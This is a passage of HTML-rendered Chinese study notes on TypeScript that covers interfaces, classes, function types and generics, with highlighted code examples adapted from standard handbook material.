里，接口的作用就是为这些类型命名和为你的代码或第三方代码定义契约。</p>\n<p>在调用函数时，传入的对象参数实际上会包含很多属性，但是编译器只会检查那些必需的属性是否存在，并且其类型是否匹配。</p>\n<h2 id=\"可选属性\"><a href=\"#可选属性\" class=\"headerlink\" title=\"可选属性\"></a>可选属性</h2><p>带有可选属性的接口与普通的接口定义差不多，只是在可选属性名字定义的后面加一个 <code>?</code> 符号。</p>\n<p>可选属性的好处之一是可以对可能存在的属性进行预定义，好处之二是可以捕获引用了不存在的属性时的错误。</p>\n<h2 id=\"只读属性\"><a href=\"#只读属性\" class=\"headerlink\" title=\"只读属性\"></a>只读属性</h2><p>可以在属性名前用 readonly 来指定只读属性。满足对象创建后不能修改属性值的限制。</p>\n<p>TypeScript 具有 <code>ReadonlyArray&lt;T&gt;</code> 类型，它与 <code>Array&lt;T&gt;</code> 相似，只是把所有可变方法去掉了，因此可以确保数组创建后再也不能被修改。</p>\n<figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> <span class=\"attr\">a</span>: <span class=\"built_in\">number</span>[] = [<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>]</span><br><span class=\"line\"><span class=\"keyword\">let</span> <span class=\"attr\">ro</span>: <span class=\"title class_\">ReadonlyArray</span>&lt;<span class=\"built_in\">number</span>&gt; = a</span><br><span class=\"line\">ro[<span class=\"number\">0</span>] = <span class=\"number\">12</span> <span class=\"comment\">// error!</span></span><br><span class=\"line\">ro.<span class=\"title function_\">push</span>(<span class=\"number\">5</span>) <span class=\"comment\">// error!</span></span><br><span class=\"line\">ro.<span class=\"property\">length</span> = <span class=\"number\">100</span> <span class=\"comment\">// error!</span></span><br><span class=\"line\">a = ro <span class=\"comment\">// error!</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 不过可以用类型断言重写</span></span><br><span class=\"line\">a = ro <span class=\"keyword\">as</span> <span class=\"built_in\">number</span>[]</span><br></pre></td></tr></table></figure>\n\n<p>最简单判断该用 readonly 还是 const 的方法是看要把它做为变量使用还是做为一个属性。</p>\n<p>做为变量使用的话用 const，若做为属性则使用 readonly。</p>\n<h2 id=\"额外的属性检查\"><a href=\"#额外的属性检查\" class=\"headerlink\" title=\"额外的属性检查\"></a>额外的属性检查</h2><p>对象字面量会被特殊对待而且会经过额外属性检查，当将它们赋值给变量或作为参数传递的时候。如果一个对象字面量存在任何“目标类型”不包含的属性时，你会得到一个错误。</p>\n<figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">interface</span> <span class=\"title class_\">SquareConfig</span> &#123;</span><br><span class=\"line\">  color?: <span class=\"built_in\">string</span></span><br><span class=\"line\">  width?: <span class=\"built_in\">number</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">createSquare</span>(<span class=\"params\">config: SquareConfig</span>): &#123; <span class=\"attr\">color</span>: <span class=\"built_in\">string</span>; <span class=\"attr\">area</span>: <span class=\"built_in\">number</span> &#125; &#123;</span><br><span class=\"line\">  <span class=\"comment\">// ...</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// error: &#x27;colour&#x27; not expected in type &#x27;SquareConfig&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> mySquare = <span class=\"title function_\">createSquare</span>(&#123; <span class=\"attr\">colour</span>: <span class=\"string\">&#x27;red&#x27;</span>, <span class=\"attr\">width</span>: <span class=\"number\">100</span> &#125;)</span><br></pre></td></tr></table></figure>\n\n<p>绕开这些检查非常简单。最简便的方法是使用类型断言。但最佳的方式是能够添加一个字符串索引签名。最后一种跳过这些检查的方式是将这个对象赋值给一个另一个变量。</p>\n<figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// as断言</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> mySquare = <span class=\"title function_\">createSquare</span>(&#123; <span class=\"attr\">width</span>: <span class=\"number\">100</span>, <span class=\"attr\">opacity</span>: <span class=\"number\">0.5</span> &#125; <span class=\"keyword\">as</span> <span class=\"title class_\">SquareConfig</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 如果SquareConfig带有上面定义的类型的color和width属性，并且还会带有任意数量的其它属性，那么我们可以这样定义它</span></span><br><span class=\"line\"><span class=\"keyword\">interface</span> <span class=\"title class_\">SquareConfig</span> &#123;</span><br><span class=\"line\">  color?: <span class=\"built_in\">string</span></span><br><span class=\"line\">  width?: <span class=\"built_in\">number</span></span><br><span class=\"line\">  [<span class=\"attr\">propName</span>: <span class=\"built_in\">string</span>]: <span class=\"built_in\">any</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 因为squareOptions不会经过额外属性检查，所以编译器不会报错</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> squareOptions = &#123; <span class=\"attr\">colour</span>: <span class=\"string\">&#x27;red&#x27;</span>, <span class=\"attr\">width</span>: <span class=\"number\">100</span> &#125;</span><br><span class=\"line\"><span class=\"keyword\">let</span> mySquare = <span class=\"title function_\">createSquare</span>(squareOptions)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"函数类型\"><a href=\"#函数类型\" class=\"headerlink\" title=\"函数类型\"></a>函数类型</h2><p>为了使用接口表示函数类型，我们需要给接口定义一个调用签名。它就像是一个只有参数列表和返回值类型的函数定义。参数列表里的每个参数都需要名字和类型。</p>\n<p>对于函数类型的类型检查来说，函数的参数名不需要与接口里定义的名字相匹配。TypeScript 编译器会要求对应位置上的参数类型是兼容的，如果不指定类型，TypeScript 的类型系统会推断出参数类型。</p>\n<h2 id=\"可索引的类型\"><a href=\"#可索引的类型\" class=\"headerlink\" title=\"可索引的类型\"></a>可索引的类型</h2><p>可索引类型具有一个索引签名，它描述了对象索引的类型，还有相应的索引返回值类型。</p>\n<p>支持两种索引签名：字符串和数字。 可以同时使用两种类型的索引，但是数字索引的返回值必须是字符串索引返回值类型的子类型。</p>\n<figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Animal</span> &#123;</span><br><span class=\"line\">  <span class=\"attr\">name</span>: <span class=\"built_in\">string</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Dog</span> <span class=\"keyword\">extends</span> <span class=\"title class_ inherited__\">Animal</span> &#123;</span><br><span class=\"line\">  <span class=\"attr\">breed</span>: <span class=\"built_in\">string</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 错误：使用&#x27;string&#x27;索引，有时会得到Animal!</span></span><br><span class=\"line\"><span class=\"keyword\">interface</span> <span class=\"title class_\">NotOkay</span> &#123;</span><br><span class=\"line\">  [<span class=\"attr\">x</span>: <span class=\"built_in\">number</span>]: <span class=\"title class_\">Animal</span></span><br><span class=\"line\">  [<span class=\"attr\">x</span>: <span class=\"built_in\">string</span>]: <span class=\"title class_\">Dog</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>字符串索引签名能够很好的描述 <code>dictionary</code> 模式，并且它们也会确保所有属性与其返回值类型相匹配。</p>\n<p>可以将索引签名设置为只读，这样就防止了给索引赋值。</p>\n<h2 id=\"类类型\"><a href=\"#类类型\" class=\"headerlink\" title=\"类类型\"></a>类类型</h2><h3 id=\"implements-实现接口\"><a href=\"#implements-实现接口\" class=\"headerlink\" title=\"implements 实现接口\"></a><code>implements</code> 实现接口</h3><p>与 C# 或 Java 里接口的基本作用一样，TypeScript 也能够用它来明确的强制一个类去符合某种契约。</p>\n<p>也可以在接口中描述一个方法，在类里实现它。接口描述了类的公共部分，而不是公共和私有两部分。它不会帮你检查类是否具有某些私有成员。</p>\n<h3 id=\"类静态部分与实例部分的区别\"><a href=\"#类静态部分与实例部分的区别\" class=\"headerlink\" title=\"类静态部分与实例部分的区别\"></a>类静态部分与实例部分的区别</h3><p>类是具有两个类型的：静态部分的类型和实例的类型。</p>\n<p>当一个类实现了一个接口时，只对其实例部分进行类型检查。 constructor 存在于类的静态部分，所以不在检查的范围内。因此，我们应该直接操作类的静态部分。</p>\n<h3 id=\"extends-继承接口\"><a href=\"#extends-继承接口\" class=\"headerlink\" title=\"extends 继承接口\"></a><code>extends</code> 继承接口</h3><p>和类一样，接口也可以相互继承。这让我们能够从一个接口里复制成员到另一个接口里，可以更灵活地将接口分割到可重用的模块里，并通过继承多个接口创建合成接口。</p>\n<h2 id=\"混合类型\"><a href=\"#混合类型\" class=\"headerlink\" title=\"混合类型\"></a>混合类型</h2><blockquote>\n<p>不懂</p>\n</blockquote>\n<p>一个例子就是，一个对象可以同时做为函数和对象使用，并带有额外的属性。</p>\n<figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">interface</span> <span class=\"title class_\">Counter</span> &#123;</span><br><span class=\"line\">  (<span class=\"attr\">start</span>: <span class=\"built_in\">number</span>): <span class=\"built_in\">string</span></span><br><span class=\"line\">  <span class=\"attr\">interval</span>: <span class=\"built_in\">number</span></span><br><span class=\"line\">  <span class=\"title function_\">reset</span>(): <span class=\"built_in\">void</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">getCounter</span>(<span class=\"params\"></span>): <span class=\"title class_\">Counter</span> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> counter = &lt;<span class=\"title class_\">Counter</span>&gt;<span class=\"keyword\">function</span> (<span class=\"params\">start: <span class=\"built_in\">number</span></span>) &#123;&#125;</span><br><span class=\"line\">  counter.<span class=\"property\">interval</span> = <span class=\"number\">123</span></span><br><span class=\"line\">  counter.<span class=\"property\">reset</span> = <span class=\"keyword\">function</span> (<span class=\"params\"></span>) &#123;&#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> counter</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> c = <span class=\"title function_\">getCounter</span>()</span><br><span class=\"line\"><span class=\"title function_\">c</span>(<span class=\"number\">10</span>)</span><br><span class=\"line\">c.<span class=\"title function_\">reset</span>()</span><br><span class=\"line\">c.<span class=\"property\">interval</span> = <span class=\"number\">5.0</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"接口继承类\"><a href=\"#接口继承类\" class=\"headerlink\" title=\"接口继承类\"></a>接口继承类</h2><p>当接口继承了一个类类型时，它会继承类的成员但不包括其实现。</p>\n<p>接口同样会继承到类的 private 和 protected 成员。 这意味着当你创建了一个接口继承了一个拥有私有或受保护的成员的类时，这个接口类型只能被这个类或其子类所实现（implement）。</p>\n<h1 id=\"类\"><a href=\"#类\" class=\"headerlink\" title=\"类\"></a>类</h1><h2 id=\"继承\"><a href=\"#继承\" class=\"headerlink\" title=\"继承\"></a>继承</h2><p>类从基类中继承了属性和方法。派生类通常被称作子类，基类通常被称作超类。</p>\n<p>派生类在自己的构造函数里必须调用 super()，即基类的构造函数。且访问 this 的属性之前，一定要调用 super()。</p>\n<h2 id=\"公共，私有与受保护的修饰符\"><a href=\"#公共，私有与受保护的修饰符\" class=\"headerlink\" title=\"公共，私有与受保护的修饰符\"></a>公共，私有与受保护的修饰符</h2><h3 id=\"public\"><a href=\"#public\" class=\"headerlink\" title=\"public\"></a><code>public</code></h3><p>在 TypeScript 里，成员都默认为 <code>public</code></p>\n<h3 id=\"private\"><a href=\"#private\" class=\"headerlink\" title=\"private\"></a><code>private</code></h3><p>不能在声明它的类的外部访问 <code>private</code> 成员。</p>\n<h3 id=\"protected\"><a href=\"#protected\" class=\"headerlink\" title=\"protected\"></a><code>protected</code></h3><p><code>protected</code> 成员在派生类中仍然可以访问。</p>\n<h3 id=\"readonly-修饰符\"><a href=\"#readonly-修饰符\" class=\"headerlink\" title=\"readonly 修饰符\"></a><code>readonly</code> 修饰符</h3><p>可以使用 <code>readonly</code> 关键字将属性设置为只读的。只读属性必须在声明时或构造函数里被初始化。</p>\n<h2 id=\"存取器\"><a href=\"#存取器\" class=\"headerlink\" title=\"存取器\"></a>存取器</h2><p>TypeScript 支持通过 getters&#x2F;setters 来截取对对象成员的访问。它能帮助你有效的控制对对象成员的访问。</p>\n<ul>\n<li>存取器要求你将编译器设置为输出 ECMAScript 5 或更高。不支持降级到 ECMAScript 3</li>\n<li>只带有 <code>get</code> 不带有 <code>set</code> 的存取器自动被推断为 <code>readonly</code> 。</li>\n</ul>\n<h2 id=\"静态属性\"><a href=\"#静态属性\" class=\"headerlink\" title=\"静态属性\"></a>静态属性</h2><p>用 <code>static</code> 定义，这些属性存在于类本身上面而不是类的实例上。</p>\n<h2 id=\"抽象类\"><a href=\"#抽象类\" class=\"headerlink\" title=\"抽象类\"></a>抽象类</h2><p>不同于接口，抽象类可以包含成员的实现细节。 <code>abstract</code> 关键字是用于定义抽象类和在抽象类内部定义抽象方法。</p>\n<p>抽象类中的抽象方法不包含具体实现并且必须在派生类中实现。</p>\n<p>抽象方法必须包含 abstract 关键字并且可以包含访问修饰符。</p>\n<h1 id=\"函数-function\"><a href=\"#函数-function\" class=\"headerlink\" title=\"函数 - function\"></a>函数 - function</h1><blockquote>\n<p>在 JavaScript 里，函数可以使用函数体外部的变量。当函数这么做时，我们说它‘捕获’了这些变量。<br>函数中使用的捕获变量不会体现在类型里。 实际上，这些变量是函数的隐藏状态并不是组成 API 的一部分。</p>\n</blockquote>\n<h2 id=\"函数类型-1\"><a href=\"#函数类型-1\" class=\"headerlink\" title=\"函数类型\"></a>函数类型</h2><p>TypeScript 能够根据返回语句自动推断出返回值类型。</p>\n<p>函数类型包含两部分：参数类型和返回值类型。当写出完整函数类型的时候，这两部分都是需要的。函数的类型只是由参数类型和返回值组成的。</p>\n<ul>\n<li>我们以参数列表的形式写出参数类型，为每个参数指定一个名字和类型。只要参数类型是匹配的，那么就认为它是有效的函数类型，而不在乎参数名是否正确。</li>\n<li>对于返回值，我们在函数和返回值类型之前使用(&#x3D;&gt;)符号，如果函数没有返回任何值，也必须指定返回值类型为 void 而不能留空。</li>\n</ul>\n<h2 id=\"函数参数\"><a href=\"#函数参数\" class=\"headerlink\" title=\"函数参数\"></a>函数参数</h2><h3 id=\"可选参数和默认参数\"><a href=\"#可选参数和默认参数\" class=\"headerlink\" title=\"可选参数和默认参数\"></a>可选参数和默认参数</h3><p>TypeScript 里的每个函数参数都是必须的。 这是指编译器检查用户是否为每个参数都传入了值，传递给一个函数的参数个数必须与函数期望的参数个数一致。</p>\n<ul>\n<li>JavaScript 里，每个参数都是可选的，可传可不传。 没传参的时候，它的值就是 undefined。</li>\n<li>在 TypeScript 里我们可以在参数名旁使用?实现可选参数的功能。可选参数必须跟在必须参数后面。</li>\n</ul>\n<p>在 TypeScript 里，我们也可以为参数提供一个默认值当用户没有传递这个参数或传递的值是 undefined 时。 它们叫做有默认初始化值的参数。</p>\n<p>与普通可选参数不同的是，带默认值的参数不需要放在必须参数的后面。 如果带默认值的参数出现在必须参数前面，用户必须明确的传入 undefined 值来获得默认值。</p>\n<h3 id=\"剩余参数\"><a href=\"#剩余参数\" class=\"headerlink\" title=\"剩余参数\"></a>剩余参数</h3><p>在 JavaScript 里，你可以使用 arguments 来访问所有传入的参数。</p>\n<p>在 TypeScript 里，你可以把所有参数收集到一个变量里，剩余参数会被当做个数不限的可选参数。可以一个都没有，同样也可以有任意个。编译器创建参数数组，名字是你在省略号（…）后面给定的名字，你可以在函数体内使用这个数组。</p>\n<figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">buildName</span>(<span class=\"params\">firstName: <span class=\"built_in\">string</span>, ...restOfName: <span class=\"built_in\">string</span>[]</span>) &#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> firstName + <span class=\"string\">&#x27; &#x27;</span> + restOfName.<span class=\"title function_\">join</span>(<span class=\"string\">&#x27; &#x27;</span>)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> employeeName = <span class=\"title function_\">buildName</span>(<span class=\"string\">&#x27;Joseph&#x27;</span>, <span class=\"string\">&#x27;Samuel&#x27;</span>, <span class=\"string\">&#x27;Lucas&#x27;</span>, <span class=\"string\">&#x27;MacKinzie&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> <span class=\"attr\">buildNameFun</span>: <span class=\"function\">(<span class=\"params\">fname: <span class=\"built_in\">string</span>, ...rest: <span class=\"built_in\">string</span>[]</span>) =&gt;</span> <span class=\"built_in\">string</span> = buildName</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"this\"><a href=\"#this\" class=\"headerlink\" title=\"this\"></a><code>this</code></h2><p>JavaScript 里，<code>this</code> 的值在函数被调用的时候才会指定。</p>\n<p>当回调函数被调用时，它会被当成一个普通函数调用，<code>this</code> 将为 <code>undefined</code>，可以通过 <code>this</code> 参数来避免错误。</p>\n<h2 id=\"重载\"><a href=\"#重载\" class=\"headerlink\" title=\"重载\"></a>重载</h2><p>为同一个函数提供多个函数类型定义来进行函数重载。</p>\n<p>为了让编译器能够选择正确的检查类型，它与 JavaScript 里的处理流程相似。 它查找重载列表，尝试使用第一个重载定义。 如果匹配的话就使用这个。 因此，在定义重载的时候，一定要把最精确的定义放在最前面。</p>\n<h1 id=\"泛型-generic\"><a href=\"#泛型-generic\" class=\"headerlink\" title=\"泛型 - generic\"></a>泛型 - generic</h1><p>在像 C#和 Java 这样的语言中，可以使用泛型来创建可重用的组件，一个组件可以支持多种类型的数据。这样用户就可以以自己的数据类型来使用组件。</p>\n<p>无法创建泛型枚举和泛型命名空间。</p>\n<p>example：</p>\n<figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> identity&lt;T&gt;(<span class=\"attr\">arg</span>: T): T &#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> arg</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// 定义了泛型函数后，可以用两种方法使用</span></span><br><span class=\"line\"><span class=\"comment\">// 第一种是，传入所有的参数，包含类型参数</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> output = identity&lt;<span class=\"built_in\">string</span>&gt;(<span class=\"string\">&#x27;myString&#x27;</span>) <span class=\"comment\">// type of output will be &#x27;string</span></span><br><span class=\"line\"><span class=\"comment\">// 第二种，利用了类型推论 – 即编译器会根据传入的参数自动地帮助我们确定T的类型</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> output = <span class=\"title function_\">identity</span>(<span class=\"string\">&#x27;myString&#x27;</span>) <span class=\"comment\">// type of output will be &#x27;string&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p>泛型接口</p>\n<figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">interface</span> <span class=\"title class_\">GenericIdentityFn</span>&lt;T&gt; &#123;</span><br><span class=\"line\">  (<span class=\"attr\">arg</span>: T): T</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">function</span> identity&lt;T&gt;(<span class=\"attr\">arg</span>: T): T &#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> arg</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> <span class=\"attr\">myIdentity</span>: <span class=\"title class_\">GenericIdentityFn</span>&lt;<span class=\"built_in\">number</span>&gt; = identity</span><br></pre></td></tr></table></figure>\n\n<p>泛型类</p>\n<p>泛型类使用（&lt;&gt;）括起泛型类型，跟在类名后面。</p>\n<figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">GenericNumber</span>&lt;T&gt; &#123;</span><br><span class=\"line\">  <span class=\"attr\">zeroValue</span>: T</span><br><span class=\"line\">  <span class=\"attr\">add</span>: <span class=\"function\">(<span class=\"params\">x: T, y: T</span>) =&gt;</span> T</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> myGenericNumber = <span class=\"keyword\">new</span> <span class=\"title class_\">GenericNumber</span>&lt;<span class=\"built_in\">number</span>&gt;()</span><br><span class=\"line\">myGenericNumber.<span class=\"property\">zeroValue</span> = <span class=\"number\">0</span></span><br><span class=\"line\">myGenericNumber.<span class=\"property\">add</span> = <span class=\"keyword\">function</span> (<span class=\"params\">x, y</span>) &#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> x + y</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>泛型约束</p>\n<figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">interface</span> <span class=\"title class_\">Lengthwise</span> &#123;</span><br><span class=\"line\">  <span class=\"attr\">length</span>: <span class=\"built_in\">number</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">function</span> loggingIdentity&lt;T <span class=\"keyword\">extends</span> <span class=\"title class_\">Lengthwise</span>&gt;(<span class=\"attr\">arg</span>: T): T &#123;</span><br><span class=\"line\">  <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(arg.<span class=\"property\">length</span>) <span class=\"comment\">// Now we know it has a .length property, so no more error</span></span><br><span class=\"line\">  <span class=\"keyword\">return</span> arg</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_\">loggingIdentity</span>(<span class=\"number\">3</span>) <span class=\"comment\">// Error, number doesn&#x27;t have a .length property</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_\">loggingIdentity</span>(&#123; <span class=\"attr\">length</span>: <span class=\"number\">10</span>, <span class=\"attr\">value</span>: <span class=\"number\">3</span> &#125;) <span class=\"comment\">// OK</span></span><br></pre></td></tr></table></figure>\n\n<p>在泛型约束中使用类型参数</p>\n<p>可以声明一个类型参数，且它被另一个类型参数所约束。</p>\n<figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> getProperty&lt;T, K <span class=\"keyword\">extends</span> keyof T&gt;(<span class=\"attr\">obj</span>: T, <span class=\"attr\">key</span>: K) &#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> obj[key]</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> x = &#123; <span class=\"attr\">a</span>: <span class=\"number\">1</span>, <span class=\"attr\">b</span>: <span class=\"number\">2</span>, <span class=\"attr\">c</span>: <span class=\"number\">3</span>, <span class=\"attr\">d</span>: <span class=\"number\">4</span> &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_\">getProperty</span>(x, <span class=\"string\">&#x27;a&#x27;</span>) <span class=\"comment\">// okay</span></span><br><span class=\"line\"><span class=\"title function_\">getProperty</span>(x, <span class=\"string\">&#x27;m&#x27;</span>) <span class=\"comment\">// error: Argument of type &#x27;m&#x27; isn&#x27;t assignable to &#x27;a&#x27; | &#x27;b&#x27; | &#x27;c&#x27; | &#x27;d&#x27;.</span></span><br></pre></td></tr></table></figure>\n\n<p>在泛型里使用类类型</p>\n<p>在 TypeScript 使用泛型创建工厂函数时，需要引用构造函数的类类型。</p>\n<figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">BeeKeeper</span> &#123;</span><br><span class=\"line\">  <span class=\"attr\">hasMask</span>: <span class=\"built_in\">boolean</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">ZooKeeper</span> &#123;</span><br><span class=\"line\">  <span class=\"attr\">nametag</span>: <span class=\"built_in\">string</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Animal</span> &#123;</span><br><span class=\"line\">  <span class=\"attr\">numLegs</span>: <span class=\"built_in\">number</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Bee</span> <span class=\"keyword\">extends</span> <span class=\"title class_ inherited__\">Animal</span> &#123;</span><br><span class=\"line\">  <span class=\"attr\">keeper</span>: <span class=\"title class_\">BeeKeeper</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Lion</span> <span class=\"keyword\">extends</span> <span class=\"title class_ inherited__\">Animal</span> &#123;</span><br><span class=\"line\">  <span class=\"attr\">keeper</span>: <span class=\"title class_\">ZooKeeper</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">function</span> createInstance&lt;A <span 